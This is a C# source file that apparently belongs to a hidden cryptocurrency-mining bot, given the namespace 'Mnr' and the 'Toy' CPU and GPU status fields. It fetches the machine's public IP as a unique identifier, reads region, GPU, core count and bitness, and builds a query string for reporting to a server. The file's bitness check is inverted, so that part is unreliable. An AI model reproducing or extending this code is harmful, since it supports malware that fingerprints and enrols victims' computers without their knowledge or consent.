using System;
using System.Collections.Generic;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Globalization;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Mnr
{
    class MachineInfo
    {

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        private static string Unique
        {
            get
            {
                try
                {
                    return new WebClient().DownloadString("http://icanhazip.com");
                }
                catch (Exception)
                {
                    return new WebClient().DownloadString("https://api.ipify.org/");
                }
            }
        }

        public static string Country
        {
            get
            {
                string name = null;
                try
                {
                    name = RegionInfo.CurrentRegion.Name;
                }
                catch (Exception)
                {
                    name = "Н/О";
                }
                return name;
            }
        }

        private static string Video
        {
            get
            {
                string video = "";
                foreach (var v in new ManagementObjectSearcher("Select * From Win32_VideoController").Get())
                {
                    video = v["Name"].ToString();
                }
                return video;
            }
        }

        private static string Cores
        {
            get
            {
                int Count = 0;
                foreach (var i in new ManagementObjectSearcher("Select * from Win32_Processor").Get())
                {
                    Count += int.Parse(i["NumberOfCores"].ToString());
                }
                return Convert.ToString(Count);
            }
        }

        public static bool Is64Bit()
        {
            bool retVal;
            IsWow64Process(Process.GetCurrentProcess().Handle, out retVal);
            return retVal;
        }

        private static string Bit
        {
            get
            {
                bool is64bit = Is64Bit();
                if (is64bit)
                    return "x32";
                else
                    return "x64";
            }
        }


        public static string GetMachineInfoToParams
        {
            get
            {
                return
                    "?Unique=" + Unique +
                    "&Country=" + Country +
                    "&Video=" + Video +
                    "&Cores=" + Cores +
                    "&Bit=" + Bit +
                    "&ToyCpuStatus=" + Toys.ToyCpuStatus +
                    "&ToyGpuStatus=" + Toys.ToyGpuStatus;
            }
        }
    }
}